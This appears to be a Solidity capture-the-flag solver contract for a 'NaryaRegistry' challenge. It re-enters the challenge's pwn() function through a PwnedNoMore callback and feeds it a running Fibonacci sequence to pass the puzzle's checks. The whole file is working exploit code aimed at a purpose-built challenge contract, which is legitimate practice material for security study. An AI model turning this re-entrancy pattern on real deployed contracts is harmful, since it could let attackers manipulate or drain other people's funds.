// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import {NaryaRegistry} from "./NaryaRegistry.sol";

contract NaryaRegistrySolver {
    NaryaRegistry public immutable registry;
    uint256 public r1 = 1;
    uint256 public r2 = 1;

    constructor(address registry_) {
        registry = NaryaRegistry(registry_);
    }

    function solve() external {
        registry.register();
        registry.pwn(r1 + r2);
        registry.identifyNaryaHacker();
    }

    function PwnedNoMore(uint256) external {
        uint256 t = r1;
        r1 = r2;
        r2 = t + r2;
        registry.pwn(r1 + r2);
    }
}
